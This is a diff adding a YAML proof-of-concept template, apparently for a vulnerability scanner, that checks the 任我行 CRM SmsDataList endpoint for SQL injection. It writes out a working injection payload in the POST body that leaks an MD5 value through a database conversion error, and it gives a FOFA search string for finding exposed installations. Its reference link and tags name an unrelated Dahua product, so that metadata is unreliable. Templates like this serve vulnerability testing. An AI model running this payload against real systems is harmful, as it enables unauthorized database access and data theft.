@@ -1,0 +1,23 @@
+id: wecrm-smsdatalist-sqli
+
+info:
+  name: 任我行 CRM SmsDataList SQL注入漏洞
+  author: peiqi
+  severity: high
+  verified: true
+  description: |
+    任我行 CRM SmsDataList 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意数据库语句，获取敏感信息
+    FOFA: "欢迎使用任我行CRM"
+  reference:
+    - https://peiqi.wgpsec.org/wiki/iot/大华/大华%20智慧园区综合管理平台%20getFaceCapture%20SQL注入漏洞.html
+  tags: dahua,sqli
+  created: 2023/08/13
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /SMS/SmsDataList/?pageIndex=1&pageSize=30
+      body: /Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'%20and%201=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123123'))))%20AND%20'CvNI'='CvNI
+    expression: response.status == 200 && response.body.bcontains(b'"message":') && response.body.bcontains(b'4297f44b13955235245b2497399d7a93')
+expression: r0()
